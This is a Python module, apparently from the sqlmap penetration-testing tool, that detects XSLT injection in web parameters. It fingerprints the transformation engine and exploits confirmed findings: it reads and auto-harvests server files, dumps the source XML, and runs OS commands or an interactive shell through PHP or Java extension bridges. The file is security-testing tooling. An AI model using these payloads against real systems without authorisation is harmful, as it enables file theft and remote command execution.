#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

"""
XSLT injection ('--xslt').

An application that builds a stylesheet by concatenating user input hands over a whole transformation
language, not just a value. The tiers are ordered by what each one PROVES, not by how spectacular it is:

  T1  system-property('xsl:vendor')  the engine names itself in the response - a fingerprint, and the
                                     strongest evidence that the input really is compiled as XSLT
  T2  <xsl:value-of select="...">    arbitrary XPath evaluated and reflected in-band
  T3  malformed select               parser error naming the engine (reaches targets with fixed output)
  T4  document('file:///...')        file read, plus unparsed-text() where the engine is XSLT 2.0+

Blind out-of-band (document('http://collector/')) is NOT implemented yet; it would reuse the collector
'--xxe' already has, but nothing here drives it, so a target with no in-band or error surface is out of
reach for now.

The ELEMENT slot and the VALUE slot are different surfaces and are probed separately: input landing
between elements can introduce whole XSLT instructions, while input landing inside select="..." can only
carry an XPath expression. Nothing is inferred from a payload merely "looking like" it worked - every
tier is confirmed by a per-run random sentinel or by a value the application cannot produce by itself.

Once an injection is confirmed in the ELEMENT slot, sqlmap also probes the processor's extension bridges
(PHP php:function, Xalan java:) - each confirmed by a deterministic self-check, never by the unreliable
function-available(). A confirmed read bridge gives arbitrary file read even on an XSLT 1.0 engine, where
document() only loads XML and unparsed-text() is unavailable, so it is used for the automatic harvest and
for '--file-read'. Command execution through a bridge runs only under '--os-cmd' / '--os-shell', exactly
like the SQL and SSTI takeover. File WRITE (EXSLT exsl:document) and saxon:eval are reported but never
driven - a write is destructive and belongs to '--file-write'.
"""

import re
import time
from collections import namedtuple

from lib.core.common import beep
from lib.core.common import dataToOutFile
from lib.core.common import randomStr
from lib.core.common import urldecode
from lib.core.convert import getBytes
from lib.core.convert import getText
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import logger
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import PLACE
from lib.core.settings import XSLT_ERROR_REGEX
from lib.core.settings import XSLT_ERROR_SIGNATURES
from lib.core.settings import XSLT_MAX_FILE_LENGTH
from lib.core.settings import XSLT_MAX_HARVEST
from lib.core.settings import XSLT_XML_HARVEST
from lib.core.settings import XXE_FILE_HARVEST
from lib.core.settings import XSLT_BRIDGES
from lib.core.settings import XSLT_BRIDGE_PHP
from lib.core.settings import XSLT_BRIDGE_JAVA
from lib.core.settings import XSLT_ADVISORY_PROBES
from lib.core.settings import XSLT_VENDOR_PROPERTIES
from lib.request.connect import Connect as Request
# NOT lib.core.common.urlencode: that one keeps '&', '=' and '%' safe by design, which is exactly what
# has to be escaped here. Imported under a distinct name because _quote() below is the XPath literal.
from thirdparty.six.moves.urllib.parse import quote as _urlquote

SENTINEL = randomStr(length=10, lowercase=True)

# The sentinel is emitted as TWO adjacent literals that only become one string once concat() actually
# runs. An application that merely echoes the parameter reflects "'ab','cd'" - quotes and comma intact -
# so the joined marker "abcd" never appears, while a real transform emits it. Without this the marker sits
# verbatim in the payload and any echo endpoint matches, which reported a plain search page as vulnerable
# and then "read" /etc/shadow out of its own reflected payload.
def _marks():
    half = len(SENTINEL) // 2
    return SENTINEL[:half], SENTINEL[half:]

XSLT_PLACES = (PLACE.GET, PLACE.POST, PLACE.CUSTOM_POST)

# Where the injected text lands inside the stylesheet. They need different payloads, so the probe order
# below tries the richer one first and falls back.
CONTEXT_ELEMENT = "element"     # between elements: whole XSLT instructions can be introduced
CONTEXT_VALUE = "value"         # inside an attribute value: an XPath expression only

Slot = namedtuple("Slot", ("place", "parameter", "context", "vendor", "payload"))


def _delim(place):
    return conf.paramDel or (';' if place == PLACE.COOKIE else '&')


def _originalValue(place, parameter):
    # decoded on the way in, re-encoded by _send() on the way out, so the module works in plain text
    # and the untouched baseline probe reproduces exactly what the application originally received
    for pair in (conf.parameters.get(place) or "").split(_delim(place)):
        if '=' in pair:
            name, _, value = pair.partition('=')
            if name.strip() == parameter:
                return urldecode(value, convall=True)
    return None


def _replaceSegment(place, parameter, value):
    retVal = []
    for pair in (conf.parameters.get(place) or "").split(_delim(place)):
        if '=' in pair:
            name, _, old = pair.partition('=')
            retVal.append("%s=%s" % (name, value if name.strip() == parameter else old))
        elif pair:
            retVal.append(pair)
    return _delim(place).join(retVal)


def _send(place, parameter, value):
    """One request with the target parameter set to `value`, reusing sqlmap's request machinery so the
    URL, cookies, headers, proxy and delay all behave exactly as in a normal run.

    The value is URL-encoded (as '--ssti' already does). A stylesheet payload is XML, so it legitimately
    carries '&' - both as an XML entity (&amp;/&quot;, see _attr) and inside a command or path - and a
    raw '&' in a GET value is the parameter delimiter, which would split the request and deliver a
    truncated stylesheet."""

    if conf.delay:
        time.sleep(conf.delay)

    saved = conf.parameters.get(place, "")
    conf.parameters[place] = _replaceSegment(place, parameter, _urlquote(value, safe=""))
    try:
        if conf.verbose >= 3:
            logger.log(CUSTOM_LOGGING.PAYLOAD, "%s=%s" % (parameter, value))
        page, _, _ = Request.getPage(raise404=False, silent=True)
        return page
    except Exception as ex:
        logger.debug("XSLT probe request failed: %s" % getUnicode(ex))
        return None
    finally:
        conf.parameters[place] = saved


def _isError(page):
    return bool(page) and re.search(XSLT_ERROR_REGEX, getUnicode(page)) is not None


def _vendorFromError(page):
    for vendor, regex in XSLT_ERROR_SIGNATURES:
        if re.search(regex, getUnicode(page or "")):
            return vendor
    return None


def _echoed(page, needle):
    return bool(page) and needle in getUnicode(page)


def _attr(expression):
    """Escape an XPath expression for the XML ATTRIBUTE it is about to land in.

    Every slot ends up inside select="...", and XPath 1.0 has no escape character - so _quote() has to
    fall back to double quotes for a value containing an apostrophe, and those quotes TERMINATE the
    attribute. The stylesheet then fails to compile and the whole probe silently returns nothing:
    '--os-cmd="echo \'hi\'"' reported "no output captured", and '--file-read' of a path holding an
    apostrophe or an '&' failed against real libxslt while the same file at a plain path read fine.

    '>' is legal inside an attribute value and is left alone, so a shell redirect stays readable."""

    return (getUnicode(expression).replace("&", "&amp;")
                                  .replace("<", "&lt;")
                                  .replace('"', "&quot;"))


def _valuePayload(expression):
    """An XPath expression for the VALUE slot: the input already sits inside select="...", so only the
    expression itself is injected."""
    return _attr(expression)


# Conventional prefix for the XSLT namespace. A stylesheet must bind it to be a stylesheet at all; a
# sheet using a different prefix simply fails the element-slot probes and is found through the value slot.
_XSL_PREFIX = "xsl"


def _elementPayload(expression):
    """A whole <xsl:value-of> instruction for the ELEMENT slot. The stylesheet already binds the 'xsl'
    prefix (it could not be a stylesheet otherwise), so the instruction compiles in place."""
    return '<%s:value-of select="%s"/>' % (_XSL_PREFIX, _attr(expression))


_BUILDERS = ((CONTEXT_ELEMENT, _elementPayload), (CONTEXT_VALUE, _valuePayload))


def _concat(*parts):
    """XPath 1.0 concat() over literals."""
    return "concat(%s)" % ",".join(parts)


def _wrap(expression):
    """Wrap `expression` so its result arrives between two halves of the sentinel that only join when the
    engine evaluates the concat (see _marks)."""
    head, tail = _marks()
    return _concat(_quote(head), _quote(tail), expression, _quote(head), _quote(tail))


def _captured(page, payload, span="1,120"):
    """The text an evaluated probe returned, or None.

    Two independent conditions must hold, because either alone has been shown to be forgeable:
      1. the page carries the JOINED sentinel, which only a real concat() can produce, and
      2. the page does NOT carry the raw injected expression - a compiled transform emits its RESULT,
         never its source text, so seeing the expression back means the input was reflected, not run.
    """

    if not page:
        return None
    page = getUnicode(page)
    if payload and getUnicode(payload) in page:
        return None                     # reflected verbatim: nothing was evaluated
    head, tail = _marks()
    marker = re.escape(head + tail)
    match = re.search(r"%s(.{%s}?)%s" % (marker, span, marker), page, re.DOTALL)
    return match.group(1) if match else None


def _quote(value):
    """XPath 1.0 string literal. The language has no escape character, so a value containing both quote
    kinds has to be assembled with concat() - and an unquotable path must not be silently mangled into a
    payload that means something else."""

    value = getUnicode(value)
    if "'" not in value:
        return "'%s'" % value
    if '"' not in value:
        return '"%s"' % value
    parts = []
    for index, chunk in enumerate(value.split("'")):
        if index:
            parts.append('"\'"')
        if chunk:
            parts.append("'%s'" % chunk)
    return "concat(%s)" % ",".join(parts)


def _probeVendor(place, parameter, baseline):
    """T1: ask the engine to name itself. A response carrying SENTINEL+vendor+SENTINEL cannot be produced
    by an application that merely echoes the parameter - the vendor string is the engine's own."""

    for context, build in _BUILDERS:
        for prop in XSLT_VENDOR_PROPERTIES:
            payload = build(_wrap("system-property(%s)" % _quote(prop)))
            captured = _captured(page=_send(place, parameter, payload), payload=payload, span="0,120")
            if captured is None:
                continue
            if captured.strip():
                return context, captured.strip(), payload
            # An EMPTY capture between the joined halves still proves concat() ran (this engine simply
            # leaves the property unset), so it confirms execution without naming a vendor.
            return context, None, payload
    return None, None, None


def _probeEval(place, parameter, baseline):
    """T2: no vendor property came back, so prove evaluation with pure XPath arithmetic. The operands are
    random per run, so the product exists nowhere in the application."""

    a, b = randomStr(length=4, alphabet="123456789"), randomStr(length=4, alphabet="123456789")
    expected = str(int(a) * int(b))
    for context, build in _BUILDERS:
        payload = build(_wrap("string(%s * %s)" % (a, b)))
        captured = _captured(page=_send(place, parameter, payload), payload=payload)
        if captured is not None and captured.strip() == expected:
            return context, payload, "%s*%s=%s" % (a, b, expected)
    return None, None, None


def _stable(place, parameter, value):
    """Send `value` twice and return the page only when both answers agree - a one-off difference is
    noise, and detection built on noise is how a scanner invents findings."""

    first = _send(place, parameter, value)
    if first is None:
        return None
    second = _send(place, parameter, value)
    if second is None:
        return None
    return first if getUnicode(first) == getUnicode(second) else None


def _probeCompile(place, parameter, baseline):
    """T3: prove the input is COMPILED as part of the stylesheet, for targets that reflect nothing.

    The two slots are told apart by what breaks them, which is a property of XSLT rather than a guess:
    inside select="..." a bare apostrophe leaves an unterminated literal and the stylesheet fails to
    compile, whereas between elements the very same apostrophe is ordinary text and changes nothing. So a
    bare quote that breaks the page means the VALUE slot; a slot that only breaks on a malformed
    <xsl:value-of/> is the ELEMENT slot.

    'Breaks' is satisfied either by a parser error (which also names the engine) or - where the
    application swallows errors - by a reproducible difference from the untouched baseline. The latter is
    the only tier that reaches a target with fixed output and no error surface."""

    if baseline is None or _isError(baseline):
        return None, None, None         # no usable reference to compare against

    # `or "x"` would replace an intentionally EMPTY parameter with a value it never had, so the
    # baseline would not be the application's own
    original = _originalValue(place, parameter)
    original = "x" if original is None else original

    # For BOTH slots the 'valid' form has to be one that leaves the page identical to the baseline. Using
    # an instruction that EMITS a sentinel for the element slot made that condition unsatisfiable on every
    # engine (a real one prints the sentinel, an echo reflects the instruction), so the whole element
    # branch was unreachable and element slots with swallowed errors were silently missed.
    for context, valid, broken, xpathy in (
        (CONTEXT_VALUE, original, "%s'" % original, "concat(%s,'')" % original),
        (CONTEXT_ELEMENT, original, '<%s:value-of select="\'"/>' % _XSL_PREFIX,
         _elementPayload("substring('',1,0)")),
    ):
        brokenPage = _stable(place, parameter, broken)
        if brokenPage is None:
            continue

        if _isError(brokenPage):
            return context, _vendorFromError(brokenPage) or "Generic XSLT", broken

        # No error surface, so the DIFFERENCE is the only signal - and a difference alone proves nothing
        # about XSLT. Any parser breaks on a stray apostrophe: a SQL string, an XQuery predicate, a shell
        # word. Three conditions have to hold together before this counts:
        #   1. the broken form changes the page,
        #   2. the untouched form reproduces the baseline (so the parameter is not simply volatile),
        #   3. an XPath FUNCTION CALL is accepted and behaves like the baseline - which a SQL or XQuery
        #      string context cannot do, because there the same text is just a literal that matches
        #      nothing and changes the page.
        # Without (3) this tier would report XSLT injection on every quote-sensitive parameter.
        if getUnicode(brokenPage) == getUnicode(baseline):
            continue
        validPage = _stable(place, parameter, valid)
        if validPage is None or getUnicode(validPage) != getUnicode(baseline):
            continue
        if xpathy is not None:
            xpathyPage = _stable(place, parameter, xpathy)
            if xpathyPage is None or getUnicode(xpathyPage) != getUnicode(baseline):
                continue
        return context, "Generic XSLT", broken

    return None, None, None


def _readFile(place, parameter, context, path, readers=("unparsed-text", "document"), bridges=()):
    """T4: read a file. A confirmed extension bridge (php:function / java:) is tried first because it
    reaches ANY file on a 1.0 engine. Otherwise document() parses its target as XML, so a non-XML file
    only surfaces through unparsed-text() (XSLT 2.0+). Whichever returns content wins."""

    for bridge in bridges:
        content = _bridgeRead(place, parameter, bridge, path)
        if content and content.strip():
            return content, "%s bridge" % bridge[0].split(" ")[0].lower()

    build = dict(_BUILDERS)[context]
    uri = path if "://" in path else "file:///%s" % getText(path).replace("\\", "/").lstrip("/")

    candidates = [_ for _ in (("unparsed-text", "unparsed-text(%s)" % _quote(uri)),
                              ("document", "string(document(%s))" % _quote(uri))) if _[0] in readers]
    for _reader, expression in candidates:
        payload = build(_wrap(expression))
        captured = _captured(page=_send(place, parameter, payload), payload=payload, span="1,%d" % XSLT_MAX_FILE_LENGTH)
        if captured and captured.strip():
            return captured[:XSLT_MAX_FILE_LENGTH], expression
    return None, None


def _dumpSourceDocument(place, parameter, context):
    """Exfiltrate the XML document the stylesheet is transforming - the XSLT-native equivalent of the
    'dump' the other non-SQL engines perform automatically. <xsl:copy-of select="/"/> serialises the whole
    input tree, which is the actual application data the transformation was built to render."""

    if context != CONTEXT_ELEMENT:
        return None     # a value slot can only carry an expression, and copy-of is an instruction

    # copy-of is an instruction, not an expression, so the sentinel cannot be split through concat here.
    # The reflection guard in _captured() is what keeps an echo endpoint from handing back its own
    # <xsl:copy-of/> text as if it were the transformed document.
    head, tail = _marks()
    payload = "%s%s<%s:copy-of select=\"/\"/>%s%s" % (head, tail, _XSL_PREFIX, head, tail)
    captured = _captured(page=_send(place, parameter, payload), payload=payload, span="1,%d" % XSLT_MAX_FILE_LENGTH)
    if captured and captured.strip() and "copy-of" not in captured:
        return captured.strip()[:XSLT_MAX_FILE_LENGTH]
    return None


def _harvestFiles(place, parameter, context, bridges=()):
    """Proactive, best-effort file harvest once the injection is CONFIRMED, the way the other non-SQL
    engines auto-dump what they can reach: a user who reaches for '--xslt' should not have to know that
    '--file-read' exists to see impact.

    A confirmed bridge reads arbitrary text on any engine, so the plain-text targets (/etc/passwd etc.)
    are harvested through it. Without one, the two portable readers cover different engines: unparsed-text()
    takes any text file but needs XSLT 2.0+, while document() works on 1.0 (most of the installed base)
    yet only loads well-formed XML. Content is de-duplicated so an engine that resolves every missing path
    to the same stub cannot masquerade as many distinct reads. Bounded by XSLT_MAX_HARVEST."""

    harvested = []
    seen = set()
    read = set()

    # every confirmed bridge, not just the first: _readFile() already falls through all of them, and a
    # bridge that fails on one path (permissions, a binary file) must not strand the rest of the harvest
    plans = [(_, XXE_FILE_HARVEST) for _ in bridges]        # arbitrary-text read on any engine
    plans.append((None, XXE_FILE_HARVEST))                  # unparsed-text() (XSLT 2.0+)
    plans.append((None, XSLT_XML_HARVEST))                  # document() (XSLT 1.0, XML only)

    for bridge, paths in plans:
        for path in paths:
            if len(harvested) >= XSLT_MAX_HARVEST:
                return harvested
            if path in read:
                continue        # a later plan must not re-probe what an earlier one already returned
            if bridge is not None:
                content = _bridgeRead(place, parameter, bridge, path)
                how = "%s bridge" % bridge[0].split(" ")[0].lower()
            else:
                reader = "unparsed-text" if paths is XXE_FILE_HARVEST else "document"
                content, how = _readFile(place, parameter, context, path, readers=(reader,))
            if not (content and content.strip()):
                continue
            read.add(path)
            key = content.strip()
            if key in seen:
                continue
            seen.add(key)
            harvested.append((path, content, how))
    return harvested


def _bridgeElementPayload(prefix, uri, expression):
    """An <xsl:value-of> that BINDS the extension namespace the bridge needs. Only the element slot can do
    this - the value slot cannot introduce a namespace - so bridge exploitation is element-slot only. The
    expression is sentinel-wrapped like every other probe, so an echo endpoint cannot forge the result."""
    return '<%s:value-of xmlns:%s="%s" select="%s"/>' % (_XSL_PREFIX, prefix, uri, _attr(_wrap(expression)))


def _confirmBridge(place, parameter, bridge):
    """Confirm a bridge by EVALUATION, not by function-available() (which Xalan answers 'false' to while
    the bridge works). The self-check transforms a per-run random input in a way the application cannot:
    PHP reverses a marker, Xalan hex-encodes a random integer. The sentinel-split wrap defeats reflection,
    and the transformed value defeats a lucky echo of the operand."""

    _label, kind, prefix, uri, _readT, _execT = bridge
    if kind == XSLT_BRIDGE_PHP:
        marker = randomStr(length=8, lowercase=True)
        expression = "php:function('strrev',%s)" % _quote(marker)
        expected = marker[::-1]
    elif kind == XSLT_BRIDGE_JAVA:
        number = int(randomStr(length=6, alphabet="123456789"))
        expression = "java:java.lang.Integer.toHexString(%d)" % number
        expected = "%x" % number
    else:
        return False
    payload = _bridgeElementPayload(prefix, uri, expression)
    captured = _captured(page=_send(place, parameter, payload), payload=payload, span="0,64")
    return captured is not None and captured.strip() == expected


def _detectBridges(place, parameter, context):
    """The extension bridges confirmed working on this injection. Element slot only (a bridge needs its
    namespace bound), so the value slot returns nothing."""

    if context != CONTEXT_ELEMENT:
        return []
    return [bridge for bridge in XSLT_BRIDGES if _confirmBridge(place, parameter, bridge)]


def _bridgeRead(place, parameter, bridge, path):
    """Arbitrary file read through a confirmed bridge - unlike document() (XML only) and unparsed-text()
    (XSLT 2.0+), this reaches any file the process can open, on a 1.0 engine."""

    _label, _kind, prefix, uri, readT, _execT = bridge
    expression = readT % _quote(getText(path))
    payload = _bridgeElementPayload(prefix, uri, expression)
    captured = _captured(page=_send(place, parameter, payload), payload=payload, span="1,%d" % XSLT_MAX_FILE_LENGTH)
    if captured and captured.strip():
        return captured[:XSLT_MAX_FILE_LENGTH]
    return None


def _bridgeExec(place, parameter, bridge, command):
    """Run one OS command through a confirmed exec bridge and return its captured stdout, or None. Only
    reached under --os-cmd / --os-shell."""

    _label, _kind, prefix, uri, _readT, execT = bridge
    if not execT:
        return None
    payload = _bridgeElementPayload(prefix, uri, execT % _quote(getText(command)))
    captured = _captured(page=_send(place, parameter, payload), payload=payload, span="0,%d" % XSLT_MAX_FILE_LENGTH)
    return captured.rstrip("\n") if captured is not None else None


def _advisories(place, parameter, context):
    """Report - never drive - the file-write / eval surfaces. Their availability is the finding: a write
    is destructive ('--file-write' territory) and saxon:eval needs Saxon-PE/EE."""

    build = dict(_BUILDERS)[context]
    retVal = []
    for label, expression in XSLT_ADVISORY_PROBES:
        payload = build(_wrap(expression))
        captured = _captured(page=_send(place, parameter, payload), payload=payload, span="0,40")
        # the probe answers the STRING 'true'/'false', so only an explicit 'true' counts
        if captured is not None and captured.strip().lower() == "true":
            retVal.append(label)
    return retVal


def _osShell(execFn):
    """Interactive OS-shell loop (runs under --batch like the SQL one). EOF / 'exit' / 'quit' leaves."""
    from lib.core.common import readInput
    logger.info("calling XSLT OS shell. Enter commands or 'exit'/'quit' to leave")
    while True:
        command = readInput("os-shell> ", checkBatch=False)
        if not command or command.strip().lower() in ("exit", "quit"):
            break
        execFn(command.strip())


def _dumpFileRead(remoteFile, content):
    try:
        localPath = dataToOutFile(remoteFile, getBytes(content))
    except Exception as ex:
        logger.debug("could not save the XSLT-read file to disk: %s" % getUnicode(ex))
        localPath = None
    if localPath:
        conf.dumper.rFile([localPath])
    else:
        conf.dumper.singleString("XSLT file read ('%s'):\n%s" % (remoteFile, content))


def _report(slot, title, extra=None):
    lines = ["---", "Parameter: %s (%s)" % (slot.parameter, slot.place),
             "    Type: XSLT injection", "    Title: %s" % title,
             "    Payload: %s=%s" % (slot.parameter, slot.payload)]
    if slot.vendor:
        lines.append("    Engine: %s" % slot.vendor)
    for line in (extra or []):
        lines.append("    %s" % line)
    lines.append("---")
    conf.dumper.singleString("\n".join(lines))


def xsltScan():
    global SENTINEL
    SENTINEL = randomStr(length=10, lowercase=True)

    debugMsg = "'--xslt' is self-contained: it detects XSLT injection in HTTP parameters, fingerprints "
    debugMsg += "the transformation engine and reads files through it. SQL enumeration switches "
    debugMsg += "(--banner, --dbs, --tables, --users, --sql-query) are ignored"
    logger.debug(debugMsg)

    if not conf.paramDict:
        logger.error("no request parameters to test (use --data, GET params, or similar)")
        return

    tested = found = 0

    for place in (_ for _ in XSLT_PLACES if _ in conf.paramDict):
        for parameter in list(conf.paramDict[place].keys()):
            if conf.testParameter and parameter not in conf.testParameter:
                continue

            tested += 1
            logger.info("testing XSLT injection on %s parameter '%s'" % (place, parameter))

            _orig = _originalValue(place, parameter)
            baseline = _send(place, parameter, "x" if _orig is None else _orig)

            context, vendor, payload = _probeVendor(place, parameter, baseline)
            title = "XSLT in-band (engine fingerprint)"
            detail = None

            if context is None:
                context, payload, detail = _probeEval(place, parameter, baseline)
                title = "XSLT in-band (arithmetic evaluation)"
                vendor = None

            if context is None:
                context, vendor, payload = _probeCompile(place, parameter, baseline)
                title = "XSLT compile-differential (no reflection)"
                detail = None

            if context is None:
                continue

            found += 1
            if conf.beep:
                beep()

            vendor = vendor or _vendorFromError(baseline) or "Generic XSLT"
            slot = Slot(place=place, parameter=parameter, context=context, vendor=vendor, payload=payload)
            logger.info("%s parameter '%s' is vulnerable to XSLT injection (engine: '%s', %s context)"
                        % (place, parameter, vendor, context))

            extra = []
            if detail:
                extra.append("Proof: the engine computed %s" % detail)

            # Confirmed-by-evaluation extension bridges (php:function / java:). These are real read/exec
            # primitives, not a function-available() guess, and reading a file through one is the same
            # risk class as document() - which this engine already drives - so the read is automatic.
            bridges = _detectBridges(place, parameter, context)
            execBridge = next((_ for _ in bridges if _[5]), None)
            if bridges:
                extra.append("Extension bridges confirmed: %s" % ", ".join(_[0] for _ in bridges))

            advisories = _advisories(place, parameter, context)
            if advisories:
                extra.append("Extensions available (NOT exercised): %s" % ", ".join(advisories))

            _report(slot, title, extra)

            wantsExec = any(conf.get(_) for _ in ("osCmd", "osShell"))

            # --os-cmd / --os-shell: command execution runs ONLY when explicitly asked, exactly like the
            # SQL and SSTI takeover. Without an exec bridge sqlmap says so rather than pretending.
            if wantsExec:
                if execBridge is None:
                    # naming java: here was misleading: it IS an exec-capable namespace in general, but
                    # this engine drives it read-only on purpose (no stdout comes back), so a target
                    # with ONLY the java bridge confirmed was told to look for something it already had
                    readOnly = ", ".join(_[0] for _ in bridges if not _[5])
                    errMsg = "OS command execution needs a confirmed exec bridge (php:function); "
                    errMsg += ("the '%s' bridge is read-only here" % readOnly) if readOnly else "none is available on this target"
                    logger.error(errMsg)
                else:
                    if conf.get("osCmd"):
                        output = _bridgeExec(place, parameter, execBridge, conf.osCmd)
                        conf.dumper.singleString("XSLT os-cmd ('%s') via %s:\n%s"
                                                 % (conf.osCmd, execBridge[0], output if output is not None else "(no output captured)"))
                    if conf.get("osShell"):
                        _osShell(lambda command: conf.dumper.singleString(
                            "%s\n%s" % (command, _bridgeExec(place, parameter, execBridge, command) or "(no output captured)")))
            elif execBridge is not None:
                logger.info("the '%s' bridge allows OS command execution; you are advised to try "
                            "'--os-shell' (interactive) or '--os-cmd=<command>' (single command)" % execBridge[0])

            # A confirmed finding is exploited automatically, like every other non-SQL switch: whoever
            # reaches for '--xslt' should not need to know that '--file-read' exists to see impact. An
            # explicit '--file-read' overrides the harvest and is honoured verbatim instead.
            if conf.fileRead:
                logger.info("reading file '%s' through the XSLT engine" % conf.fileRead)
                content, how = _readFile(place, parameter, context, conf.fileRead, bridges=bridges)
                if content:
                    logger.info("XSLT file read succeeded via %s (%d characters)" % (how, len(content)))
                    if how.startswith("string(document("):
                        logger.warning("document() parses its target as XML, so this is the file's TEXT "
                                       "CONTENT rather than its raw bytes")
                    _dumpFileRead(conf.fileRead, content)
                else:
                    logger.warning("XSLT file read of '%s' failed. Without an extension bridge, document() "
                                   "only reads well-formed XML and unparsed-text() needs an XSLT 2.0+ engine "
                                   "(this one reports '%s')" % (conf.fileRead, vendor))
            else:
                source = _dumpSourceDocument(place, parameter, context)
                if source:
                    logger.info("dumping the XML document the stylesheet transforms (%d characters)" % len(source))
                    conf.dumper.singleString("XSLT: %s parameter '%s' source document\n%s" % (place, parameter, source))

                logger.info("harvesting reachable files through the XSLT engine")
                harvested = _harvestFiles(place, parameter, context, bridges=bridges)
                for path, content, how in harvested:
                    logger.info("read '%s' via %s (%d characters)" % (path, how, len(content)))
                    _dumpFileRead(path, content)
                if not harvested:
                    logger.info("no file could be read automatically (a bridge reads any file, else "
                                "document() needs well-formed XML and unparsed-text() needs XSLT 2.0+)")
                if source or harvested:
                    logger.info("use '--file-read' to target one specific file instead of this harvest")

    if not found:
        if tested:
            logger.warning("no parameter appears to be injectable via XSLT injection (%d tested)" % tested)
        else:
            logger.warning("no parameters found to test for XSLT injection")

    logger.info("XSLT scan complete")
